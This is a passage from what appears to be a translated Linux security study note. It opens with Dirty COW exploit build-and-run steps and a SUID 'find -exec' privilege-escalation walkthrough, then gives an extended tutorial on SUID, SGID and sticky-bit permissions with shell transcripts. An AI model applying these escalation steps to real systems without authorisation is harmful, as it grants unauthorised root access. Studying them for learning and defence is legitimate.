  - `sudo cmd` run a command in an authorized way

### 9.4 Dirty COW Privilege Escalation

- `https://github.com/gbonacini/CVE-2016-5195`

- `cat /etc/redhat-release`
  
  View the system version number
  
- `上传文件 脏牛提权.zip`

- `unzip 脏牛提权.zip`

- `cd CVE-2016-5195-master/`

- `make`

- `./dcow -s`

### 9.5 The Three Major Escalations

#### Linux Basics 9.5 - 1 suid in Detail (a lousy version; this explanation isn't very good)

- `find / -user root -perm -4000 -exec ls -ldb {} \`;
- `find`: the command used to find files and directories.
- `/`: specifies the starting path to search as the root directory (the whole file system).
- `-user root`: specifies that the owner of the files to find is the root user.
- `-perm -4000`: specifies that the permission mode of the files to find starts with 4 (the Setuid bit).
- `-exec ls -ldb {} \;`: runs the ls -ldb command on every file found, where the -ldb option displays file attributes in a detailed format.
  


- "perm" is the short form of "permissions". In a computer system, files and directories all have a set of permissions that determine who can read, write and execute them.
- In Linux and Unix-like systems, every file and directory has permission bits that specify the corresponding read, write and execute permissions. Permission bits are usually expressed as three digits, representing the owner's permission, the group's permission and other users' permissions respectively.
- Each permission bit can take one of the following values:
  - "r": read permission
  - "w": write permission
  - "x": execute permission
- These permission bits can be combined to form a three-digit permission mode. For example, "rwx" means read, write and execute are all granted, while "rw-" means read and write are granted but execute is not.
- On the command line you can use commands such as `chmod` to change the permissions of files and directories. For example, `chmod 755 file.txt` sets the permissions of the file "file.txt" so that the owner has read, write and execute permission while the group and other users only have read and execute permission.
- The `-perm` parameter mentioned in the command above is used with the `find` command and lets you specify the particular permission mode of the files to find. For example, `-perm -4000` means finding files with the Setuid bit (permission mode starting with 4).

- "exec" is the abbreviation of "execute", meaning to execute an executable file or command.
For example, in a Linux system you can use the following command to execute a program:
- `exec program_name`
- This makes the current process be replaced by the specified program, and that program becomes the new current process. During execution the state of the original process is discarded and the new program continues running.
- In addition, `-exec` is an option in the find command, used to execute a specified command on the files that are found. For example, using the `-exec` option in the find command lets you run a specified command on every file found. For example:
- `find /path/to/directory -name "*.txt" -exec ls -l {} \;`
- The command above finds all files ending in ".txt" under the specified directory and runs the ls -l command on every file, thereby showing the details of each file. In this case, {} is replaced by the path of each file found.

- Escalation steps
- Information gathering
  - User privilege gathering (`whoami` & `id`)
  - SUID file gathering (`find / -user root -perm -4000 -exec ls -ldb {} \;`)
- Escalation
  - Directory switching
  - Both the owner and the owning group of the find file are the root user, and the find command can execute other system commands, so the find command can be used to run whoami and view the current user. Run the command c`d  /tmp` to switch directories.
  - Arbitrary file creation
  - Create an arbitrary file; here run the command touch 1 to create the file 1
  - Escalating with a specific suid binary (find/nmap/bash etc. filename -exec whoami \;)
  - Run the command `find 1 -exec whoami \;`, using the find command to find the file named 1 and run the whoami command; as shown in the figure, the current user is root, so the privilege escalation succeeds



- The following is the real thing
- suid permissions in detail (the one above is a bit of a joke)
- Before introducing this permission, some questions need to be understood
  - 1. Can an ordinary user change their password?
  - Answer: Yes, they can change their own password
  - 2. What is the purpose of the `/etc/shadow` file?
  - Answer: it is the file that stores user passwords
  - 3. What are the permissions of the `/etc/shadow` file?
  - Answer: `-. 1 root root 1627 5月 17 00:10 /etc/shadow`
  - 4. Can an ordinary user modify the `/etc/shadow` file?
  - Answer: No, because this file gives ordinary users no permissions at all, so they can neither read nor write it.
  - 5. Then why can an ordinary user change their password?
  - Answer:
    - ① because the `passwd` command is used
    - ② in the `passwd` command's owner permission bit, the original x permission has become an s permission
    - ③ the s permission in the owner permission bit is also called the SetUID permission, SUID for short
    - ④ effect: because when a file or command with the SUID permission is used, the command is executed with the identity of the file's owner.

- What suid does in detail
- Concept: as soon as the x in a command file's owner permission bit becomes s, other users executing that command file will run it with the identity of the command file's owner.
  -if the owner permission bit has execute permission, a lowercase s is shown.
  -if the owner permission bit has no execute permission, an uppercase S is shown.

  ```
  [root@centos7 ~]# useradd hello   #创建一个用户
  [root@centos7 ~]# passwd hello    #设置它的密码
  更改用户 hello 的密码 
  新的 密码：
  重新输入新的 密码：
  passwd：所有的身份验证令牌已经成功更新。
  [root@centos7 ~]# ll /bin/passwd    #查看passwd命令权限
  -rwsr-xr-x. 1 root root 27832 6月  10 2014 /bin/passwd
  
  [root@centos7 ~]# su hello     #切换到hello用户  
  [hello@centos7 root]$ passwd    #修改密码
  更改用户 hello 的密码 。
  为 hello 更改 STRESS 密码。
  (当前)UNIX 密码：
  新的 密码：
  重新输入新的密码：
  passwd：所有的身份验证令牌已经成功更新。   #可以成功修改
  
  [hello@centos7 root]$ su root    #返回root用户
  密码：
  [root@centos7 ~]# chmod u-s /bin/passwd   #修改passwd的权限，去掉suid权限
  [root@centos7 ~]# ll /bin/passwd
  -rwxr-xr-x. 1 root root 27832 6月  10 2014 /bin/passwd   #发现s变成了x
  
  [root@centos7 ~]# su hello   #再切换到hello用户
  [hello@centos7 root]$ passwd   #修改密码
  更改用户 hello 的密码 。
  为 hello 更改 STRESS 密码。
  (当前)UNIX 密码：
  新的 密码：
  重新输入新的 密码： 
  passwd: 鉴定令牌操作错误    #密码无法进行修改
- At this point another question comes up: if an ordinary user runs the passwd command with the identity of the root user, can an ordinary user then change other users' passwords?
- Answer: No, because in the passwd command there is a check; when the passwd command runs, this check determines whether the user running it is root or an ordinary user. If it is an ordinary user, then only the passwd command can be used and no arguments may be added after it; only if it is the root user can other arguments be added after it (the argument being the user). So an ordinary user cannot change other users' passwords.

- Granting suid
  - Grant methods
  - `chmod   u+s     filename`
  - `chmod   4xxx    filename`

- Examples below
- ```
  [root@centos7 opt]# touch filename   #创建一个文件
  [root@centos7 opt]# ll   #查看详细信息
  总用量 0
  -rw-r--r--. 1 root root 0 5月  16 23:40 filename  #没有属主权限位没有执行权限
  [root@centos7 opt]# chmod u+s filename   #在属主权限位上加上s
  [root@centos7 opt]# ll   #查看详细信息
  总用量 0
  -rwSr--r--. 1 root root 0 5月  16 23:40 filename   #因为没有执行权限，所以就显示(大写)S
  [root@centos7 opt]# chmod u+x filename   #再添加执行权限
  [root@centos7 opt]# ll   #查看
  总用量 0
  -rwsr--r--. 1 root root 0 5月  16 23:40 filename   #大写S变为小写s，增加了执行权限  
  ```
- Or this way
  ```
  [root@centos7 opt]# touch filename2  #创建一个文件
  [root@centos7 opt]# ll   #查看信息
  总用量 0
  -rwsr--r--. 1 root root 0 5月  16 23:40 filename
  -rw-r--r--. 1 root root 0 5月  16 23:46 filename2   #正常创建的权限：644
  [root@centos7 opt]# chmod 4744 filename2   #增加SUID权限，并且增加属主的执行权限
  [root@centos7 opt]# ll
  总用量 0
  -rwsr--r--. 1 root root 0 5月  16 23:40 filename
  -rwsr--r--. 1 root root 0 5月  16 23:46 filename2   #属主中变成小写s
  ```

- SUID summary
  - ① lets an ordinary user temporarily have the owning user's permissions for an executable binary file
  - ② if the binary file it is set on has no execute permission, the SUID permission is shown as S (uppercase)
  - ③ the special permission suid is only valid for binary executables; it has no effect on other files or directories.
- Note: suid is unsafe; if ordinary users are allowed to use the owning user's permissions, then when an ordinary user runs the corresponding command file they can view or modify file contents at will. For example, if the etc/sudoers file is modified, that ordinary user is effectively a copy of the superuser

#### Linux Basics 9.5 - 2 sgid in Detail

This one is also maxed out
- sgid
  Default case (without sgid)

- Suppose tom and jerry belong to the same workgroup, and the files they use are all placed in the same directory; it can be set up like this:
  ```
  [root@centos7u6 tmp]# groupadd  workgroup
  [root@centos7u6 tmp]# usermod -a -G workgroup tom
  [root@centos7u6 tmp]# usermod -a -G workgroup jerry
  [root@centos7u6 tmp]# id tom
  uid=1004(tom) gid=1004(tom) groups=1004(tom),1006(workgroup)
  [root@centos7u6 tmp]# id jerry
  uid=1005(jerry) gid=1005(jerry) groups=1005(jerry),1006-(workgroup)
  ```
  Create a shared directory and change the directory's owning group to workgroup
  ```
  [root@centos7u6 tmp]# mkdir /tmp/test_SGID
  [root@centos7u6 tmp]# ls -ld test_SGID/
  drwxr-xr-x 2 root root 6 Mar 30 11:09 test_SGID/
  [root@centos7u6 tmp]# chown :workgroup /tmp/test_SGID/
  [root@centos7u6 tmp]# ls -ld test_SGID/
  drwxr-xr-x 2 root workgroup 6 Mar 30 11:09 test_SGID/
  ```
  The owning group of the /tmp/test_SGID directory needs to be given write permission, otherwise tom and jerry cannot create new files in that directory
  ```
  [tom@centos7u6 test_SGID]$ touch /tmp/test_SGID/tom_test
  touch: cannot touch ‘/tmp/test_SGID/tom_test’: Permission denied
  ```
  Create files in the /tmp/test_SGID directory with the tom and jerry users respectively
  ```
  [tom@centos7u6 ~]$ echo "tom" > /tmp/test_SGID/tom.test
  [tom@centos7u6 ~]$ cat /tmp/test_SGID/tom.test
  tom
  [jerry@centos7u6 test_SGID]$ echo "jerry" > /tmp/test_SGID/-jerry.test
  [jerry@centos7u6 test_SGID]$ cat /tmp/test_SGID/jerry.test 
  jerry
  ```
  Check the owning group of the files that were created; they are tom's and jerry's primary groups respectively
  ```
  [root@centos7u6 test_SGID]# ls  -l 
  total 8
  -rw-rw-r-- 1 jerry jerry 6 Mar 30 13:16 jerry.test
  -rw-rw-r-- 1 tom   tom   4 Mar 30 13:14 tom.test
  ```
  The above is the default case without using SGID, but in this case user tom can only view jerry.test and cannot modify the contents of jerry.test
  ```
  [root@centos7u6 test_SGID]# su tom
  [tom@centos7u6 test_SGID]$ cat jerry.test 
  jerry
  [tom@centos7u6 test_SGID]$ echo "tom2" >> jerry.test 
  bash: jerry.test: Permission denied
  ```
  Now, when tom and jerry need to be able to modify each other's files, SGID comes into play
- `usermod -a -G workgroup tom` is a Linux command used to add the user "tom" to the "workgroup" group.
- Explanation of the command's various options and arguments:
  - `usermod`: the command used to modify user accounts.
  - `a`: means adding the user to the specified group.
  - `G workgroup`: specifies that the target group the user is added to is "workgroup". Several groups can be listed after the -`G` argument, separated by commas.
  - `tom`: specifies the target user to be modified.
- After running this command, the user "tom" is added to the "workgroup" group and becomes a member of it. This means the user "tom" inherits the permissions and access level of the "workgroup" group. Users can use the groups command to see which groups they belong to.

- `chown :workgroup /tmp/test_SGID/` is a Linux command used to change the owning group of the directory `/tmp/test_SGID/` to "workgroup".
- Explanation of the command's various options and arguments:
  - `chown`: the command used to change the owner and owning group of a file or directory.
  - `:workgroup`: specifies that the target group to change to is "workgroup". The colon ":" is the symbol used to separate the owner and the owning group.
  - `/tmp/test_SGID/`: specifies the target directory to be modified.
  After running this command, the owning group of the directory `/tmp/test_SGID/` is changed to "workgroup". This means members of the "workgroup" group will have the corresponding permissions on the directory, such as read, write and execute.
  - Please note that running this command requires the appropriate permissions. Normally only an administrator or a user with specific permissions can change the owner and owning group of a directory.
- To put it plainly, chown is the command that changes the ownership of files and directories

- To give the owning group of the `/tmp/test_SGID` directory write permission, you can use the `chmod` command.
- chmod g+w /tmp/test_SGID
- Explanation of the command's various options and arguments:
  - `chmod`: the command used to modify file or directory permissions.
  - `g+w`: means adding write permission to the owning group. `g` means group, `+w` means adding write permission.
  - `/tmp/test_SGID`: specifies the target directory whose permissions are to be modified.
- After running this command, the owning group of the `/tmp/test_SGID` directory is granted write permission. This means members of the owning group can create, modify and delete files in that directory.
- Please note that running this command requires the appropriate permissions. Normally only an administrator or a user with specific permissions can modify a directory's permissions.

- After running the su tom command, the system will ask for the "tom" user's password. After entering the correct password, you switch to the "tom" user and take on that user's identity and permissions
- Please note that running this command requires the appropriate permissions. Normally only an administrator or a user with specific permissions can switch to another user's identity.
- After switching to another user's identity, you can run commands and perform operations in the new user's environment. To leave the switched identity, you can use the exit command to return to the original user.

- Owner
- Owning group
- Other users

- Using the SGID permission
- Now grant the /tmp/test_SGID directory the special SGID permission. Note that once the SGID permission is set, the x permission (execute permission) bit of the file's owning group becomes a lowercase s
  ```
  drwxrwxr-x 2 root workgroup 40 Mar 30 13:27 /tmp/test_SGID/
  [root@centos7u6 test_SGID]# chmod g+s /tmp/test_SGID/
  [root@centos7u6 test_SGID]# ls -ld /tmp/test_SGID/
  drwxrwsr-x 2 root workgroup 40 Mar 30 13:27 /tmp/test_SGID/
  ```
- Now let's create files with tom and jerry again and look at the file attributes. You can see that the owner of the newly created file is unchanged, but the owning group is no longer the user's primary group; it has become the owning group of the /tmp/tset_SGID directory
  ```
  [tom@centos7u6 test_SGID]$ echo "tom2" > /tmp/test_SGID/tom2.test
  [jerry@centos7u6 test_SGID]$ echo "jerry2" > /tmp/test_SGID/- jerry2.test
  [root@centos7u6 test_SGID]# ls -l /tmp/test_SGID/
  total 16
  -rw-rw-r-- 1 jerry workgroup 5 Mar 30 13:40 jerry2.test
  -rw-rw-r-- 1 jerry jerry     6 Mar 30 13:27 jerry.test
  -rw-rw-r-- 1 tom   workgroup 5 Mar 30 13:40 tom2.test
  -rw-rw-r-- 1 tom   tom       4 Mar 30 13:14 tom.test
  ```
- Now tom and jerry can modify the contents of the files each other created
  ```
  [tom@centos7u6 test_SGID]$ echo "tom is coming..." >> jerry2.-test 
  [tom@centos7u6 test_SGID]$ cat jerry2.test 
  jerry2
  tom is coming...
  chmod
  [jerry@centos7u6 test_SGID]$ echo "jerry is coming" >> /tmp/-test_SGID/tom2.test 
  [jerry@centos7u6 test_SGID]$ cat tom2.test 
  tom2
  jerry is coming
  ```
- By comparing, we should be able to see the role of SGID more clearly.

- How to use sgid
  - First method
    - `chmod g(+&-)s filename`
    - `chmod g+s filename` set the permission
    - `chmod g-s filename` cancel the permission
  - Second method
    - Use octal permission assignment
    - `chmod 2775 /tmp/test` set the permission
    - `chmod 775 /tmp/test`

  | suid  | sgid  | sbit  | Octal permission |
  | :: | :: | :: | :--: |
  |   0   |   0   |   0   |     0      |
  |   0   |   0   |   1   |     1      |
  |   0   |   1   |   0   |     2      |
  |   0   |   1   |   1   |     3      |
  |   1   |   0   |   0   |     4      |
  |   1   |   0   |   1   |     5      |
  |   1   |   1   |   0   |     6      |
  |   1   |   1   |   1   |     7      |

- Determining whether the sgid permission is set
  - sgid's display position is in the file array's group x permission position
  - If SGID is set
    - if the group originally had execute permission, the group's execute permission bit shows a lowercase s
    - if the group originally had no execute permission, the group's execute permission bit shows an uppercase S
  - If SUID is not set
    - the group's execute permission bit still shows x or - according to its basic permission
  ```
  [root@centos7u6 test_SGID]# ls -ld /tmp/test_SGID/
  -drwxrwsr-x 2 root workgroup 40 Mar 30 13:27 /tmp/test_SGID/
  ```

- The locate command
- In Linux systems, SGID is mostly used on directories, but it can also be used on files; the locate command is one of them.
- The storage path of the locate command file is as follows; the file's owner is root and its group is locate.
```
[root@centos7u6 test_SGID]# ls /usr/bin/locate -l
-rwx--s--x 1 root slocate 40520 Apr 11  2018 /usr/bin/locate
```
- The locate command performs its search based on a search of the indexes in a database. The database's path and name are `/var/lib/mlocate/mlocate.db`; you can see that the owner of the mlocate.db file is root and its group is slocate.
  ```
  [root@centos7u6 ~]# ls -l /var/lib/mlocate/mlocate.db 
  -rw-r-- 1 root slocate 597052 Mar 30 14:32 /var/lib/mlocate/mlocate.db
  ```
- Because the locate command file has the SGID permission, when an ordinary user tom uses the locate command to search and starts a process, tom is temporarily added to the slocate group, and users in the slocate group have r permission (read permission) on the mlocate.db file, so this process can read the contents of the database file and complete the search operation.
  ```
  [tom@centos7u6 ~]$ locate fstab
  /etc/fstab
  /usr/lib/dracut/modules.d/95fstab-sys
  /usr/lib/dracut/modules.d/95fstab-sys/module-setup.sh
  /usr/lib/dracut/modules.d/95fstab-sys/mount-sys.sh
  /usr/lib/systemd/system-generators/systemd-fstab-generator
  /usr/share/man/man5/fstab.5.gz
  /usr/share/man/man8/systemd-fstab-generator.8.gz
  ```
- If we cancel the locate command's SGID permission, then when tom runs the locate command he will not be temporarily added to the slocate group, and when this process accesses the database as the other user it will be refused for lack of read permission, which ultimately makes the search operation fail.
  ```
  [root@centos7u6 ~]# chmod g-s /usr/bin/locate 
  [root@centos7u6 ~]# ls -l /usr/bin/locate
  -rwx--x--x 1 root slocate 40520 Apr 11  2018 /usr/bin/locate
  [root@centos7u6 ~]# su tom
  [tom@centos7u6 root]$ locate fstab
  locate: can not stat () `/var/lib/mlocate/mlocate.db': Permission denied
  [tom@centos7u6 root]$ 
  ```

- Things to note when using SGID
  - it can be used on binary files
  - the file's owning group needs x permission
  - sgid's lifetime: sgid is in effect while this program runs as a process, and once the process ends the sgid permission disappears with it
  - it can be used on directories
    - the directory's owning group needs r permission, so that you can enter the directory
    - the directory's owning group needs to have w permission, so that users can create files in the directory
    - the directory's owning group needs to have x permission, so that sgid takes effect

#### Linux Basics 9.5 - 3 sbit in Detail

- sticky bit in detail (the sticky bit) protects the files of other owners and groups in this directory from being deleted at will by other users
- If those other users' permission bit has execute permission, a lowercase t is shown.
- If those other users' permission bit has no execute permission, an uppercase T is shown.
- Concept: it only applies to directories. When the sticky bit permission is not set on a directory and that directory gives all users read, write and execute permission, files or directories created in that directory by an ordinary user will be deleted by other users.
  ```
  [root@centos7 opt]# mkdir yude    #创建目录yude
  [root@centos7 opt]# ll   #查看权限
  总用量 0
  drwxr-xr-x. 2 root root 6 5月  17 09:26 yude   #权限为755
  [root@centos7 opt]# chmod 777 yude   #修改权限为777
  [root@centos7 opt]# ll
  总用量 0
  drwxrwxrwx. 2 root root 6 5月  17 09:26 yude  #权限为777
  [root@centos7 opt]# cd yude     #进入所创建的目录
  
  [root@centos7 yude]# su hello     #切换到hello用户
  [hello@centos7 yude]$ touch aaa   在目录下创建文件aaa
  [hello@centos7 yude]$ ll
  总用量 0
  -rw-rw-r--. 1 hello hello 0 5月  17 09:26 aaa   #文件aaa创建成功
  
  [hello@centos7 yude]$ exit    #返回上一级目录
  exit
  [root@centos7 yude]# su ydq   #切换到ydq用户
  [ydq@centos7 yude]$ ll   
  总用量 0
  -rw-rw-r--. 1 hello hello 0 5月  17 09:26 aaa   #可以看到hello用户所创建文件aaa
  [ydq@centos7 yude]$ rm -rf ./aaa   #进行删除aaa文件
  [ydq@centos7 yude]$ ll    #文件已被删除
  总用量 0
  ```
- Concept: when the sticky bit permission is set on a directory, files or directories created in that directory by an ordinary user can only be deleted by the user who owns that file or directory, or by the root user; other users cannot delete directories or files created by other users.
  ```
  [root@centos7 opt]# ll    #查看权限
  总用量 0
  drwxrwxrwx. 2 root root 6 5月  17 09:27 yude   #权限为777
  [root@centos7 opt]# chmod o+t yude   #增加sticky bit权限
  [root@centos7 opt]# ll   #查看权限
  总用量 0
  drwxrwxrwt. 2 root root 6 5月  17 09:27 yude   #其它用户上权限多了sticky bit权限
  [root@centos7 opt]# cd yude  #进入到yude目录下面
  
  [root@centos7 yude]# su hello    #切换hello用户
  [hello@centos7 yude]$ touch bbb    #创建一个文件
  [hello@centos7 yude]$ ll    #查看文件，文件正常创建
  总用量 0
  -rw-rw-r--. 1 hello hello 0 5月  17 09:39 bbb    
  
  [hello@centos7 yude]$ exit   #退出当前用户
  exit
  [root@centos7 yude]# su ydq    #切换到ydq用户
  [ydq@centos7 yude]$ ll
  总用量 0
  -rw-rw-r--. 1 hello hello 0 5月  17 09:39 bbb   #可以查看到hello用户创建的文件
  [ydq@centos7 yude]$ rm -rf ./bbb   #进行删除bbb文件
  rm: 无法删除"./bbb": 不允许的操作     #无法进行删除
  ```

Granting the Sticky bit
- Grant methods
  - `chmod   o+t     filename`
  - `chmod   1xxx    filename`

- Sticky bit summary
  - ① lets multiple users all have write permission, and lets each user only delete their own files
  - ② the sticky setting on a directory shows in the others x bit, shown as a lowercase t, or an uppercase T when there is no execute permission
  - ③ even if a directory's permissions are set to "777", if the sticky bit is set, only the directory's owner and the "root" user have permission to delete; other users are not allowed to delete.
